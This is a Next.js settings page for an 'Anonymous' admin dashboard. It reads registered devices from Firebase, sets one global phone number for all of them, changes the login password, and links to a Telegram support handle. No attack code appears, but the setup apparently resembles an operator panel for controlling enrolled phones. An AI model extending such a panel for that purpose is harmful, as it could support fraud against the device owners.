"use client";

import { useEffect, useState } from "react";
import { Card, CardBody, Button, Input } from "@heroui/react";
import { db } from "@/lib/firbase";
import { get, ref } from "firebase/database";
import { usePathname } from "next/navigation";
import Link from "next/link";
import LineSpinner from "@/components/LineSpinner";

export default function SettingsPage() {
  const pathname = usePathname();
  const [currentNumber, setCurrentNumber] = useState("Loading...");
  const [globalPhone, setGlobalPhone] = useState("");
  const [currentCode, setCurrentCode] = useState("");
  const [newCode, setNewCode] = useState("");
  const [confirmCode, setConfirmCode] = useState("");
  const [updatingCode, setUpdatingCode] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  const loadCurrentGlobalNumber = async () => {
    try {
      const snapshot = await get(ref(db, "registeredDevices"));

      if (!snapshot.exists()) {
        setCurrentNumber("Not set");
        return;
      }

      const devices = snapshot.val() as Record<string, Record<string, unknown>>;
      const foundNumber = Object.values(devices)
        .map((device) =>
          typeof device.globalPhoneNumber === "string"
            ? device.globalPhoneNumber.trim()
            : "",
        )
        .find((value) => value.length > 0);

      setCurrentNumber(foundNumber || "Not set");
    } catch {
      setCurrentNumber("Not set");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    void loadCurrentGlobalNumber();
  }, []);

  const handleSavePhone = async () => {
    try {
      const resp = await fetch("/api/updateglobalphone", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phone: globalPhone }),
      });

      const data = await resp.json();

      if (!data.success) {
        alert(
          "Failed to update global phone number: " +
            (data.error || "Unknown error"),
        );
      } else {
        alert("Global phone number updated successfully");
        setCurrentNumber(globalPhone.trim() || "Not set");
        setGlobalPhone("");
        void loadCurrentGlobalNumber();
      }
    } catch {
      alert("An error occurred while updating the global phone number");
    }
  };

  const handleUpdateCode = async () => {
    if (!currentCode || !newCode || !confirmCode) {
      alert("Please fill in all code fields");
      return;
    }

    if (newCode !== confirmCode) {
      alert("New code and confirm code do not match");
      return;
    }

    try {
      setUpdatingCode(true);

      const response = await fetch("/api/updateAdminCode", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          currentCode,
          newCode,
          confirmCode,
        }),
      });

      const data = (await response.json()) as {
        success?: boolean;
        message?: string;
      };

      if (!response.ok || !data.success) {
        alert(data.message || "Failed to update code");
        return;
      }

      alert("Code updated successfully");
      setCurrentCode("");
      setNewCode("");
      setConfirmCode("");
    } catch {
      alert("An error occurred while updating code");
    } finally {
      setUpdatingCode(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            Anonymous
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
        <a
  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
  target="_blank"
  rel="noopener noreferrer"
  className="text-white/85 transition-colors hover:text-white"
>
  Support
</a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                window.location.href = "/login";
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {isLoading ? (
        <LineSpinner />
      ) : (
      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5">
            <Card className="rounded-xl border border-[#bfc3c7] bg-white shadow-2xl">
              <CardBody className="p-4 sm:p-6">
                <h2 className="mb-4 text-lg font-bold text-[#083154] sm:text-2xl">
                  Change Number:
                </h2>

                <p className="mb-4 text-base font-bold text-[#111] sm:text-xl">
                  Current Number:{" "}
                  <span className="font-normal">{currentNumber}</span>
                </p>

                <Input
                  value={globalPhone}
                  onValueChange={setGlobalPhone}
                  placeholder="Enter New Number (91........)"
                  classNames={{
                    input:
                      "text-base text-[#111] placeholder:text-[#7a7a7a] sm:text-xl",
                    inputWrapper:
                      "h-12 border border-[#2f2f2f] bg-white   shadow-none rounded-lg sm:h-16",
                  }}
                />

                <Button
                  onPress={handleSavePhone}
                  className="mt-6 h-11 min-w-24 rounded-lg border border-[#0b4c85] bg-white px-6 text-base font-semibold text-[#0b3154] shadow-[0_0_0_1px_#0b4c85] sm:h-14 sm:px-8 sm:text-2xl"
                >
                  Save
                </Button>
              </CardBody>
            </Card>

            <Card className="rounded-xl border border-[#bfc3c7] bg-white shadow-2xl">
              <CardBody className="p-4 sm:p-6">
                <h2 className="mb-4 text-lg font-bold text-[#083154] sm:text-2xl">
                  Change Password (Login Password):
                </h2>

                <div className="space-y-4">
                  <Input
                    type="password"
                    value={currentCode}
                    onValueChange={setCurrentCode}
                    placeholder="Current Password"
                    classNames={{
                      input:
                        "text-base text-[#111] placeholder:text-[#7a7a7a] sm:text-xl",
                      inputWrapper:
                        "h-12 border border-[#2f2f2f] bg-white  shadow-none rounded-lg sm:h-16",
                    }}
                  />

                  <Input
                    type="password"
                    value={newCode}
                    onValueChange={setNewCode}
                    placeholder="New Password"
                    classNames={{
                      input:
                        "text-base text-[#111] placeholder:text-[#7a7a7a] sm:text-xl",
                      inputWrapper:
                        "h-12 border border-[#2f2f2f] bg-white  shadow-none rounded-lg sm:h-16",
                    }}
                  />

                  <Input
                    type="password"
                    value={confirmCode}
                    onValueChange={setConfirmCode}
                    placeholder="Confirm Password"
                    classNames={{
                      input:
                        "text-base text-[#111] placeholder:text-[#7a7a7a] sm:text-xl",
                      inputWrapper:
                        "h-12 border border-[#2f2f2f] bg-white  shadow-none rounded-lg sm:h-16",
                    }}
                  />
                </div>

                <Button
                  onPress={handleUpdateCode}
                  isLoading={updatingCode}
                  className="mt-6 h-11 min-w-24 rounded-lg border border-[#0b4c85] bg-white px-6 text-base font-semibold text-[#0b3154] shadow-[0_0_0_1px_#0b4c85] sm:h-14 sm:px-8 sm:text-2xl"
                >
                  Save
                </Button>
              </CardBody>
            </Card>
          </div>
      </main>
      )}
    </div>
  );
}
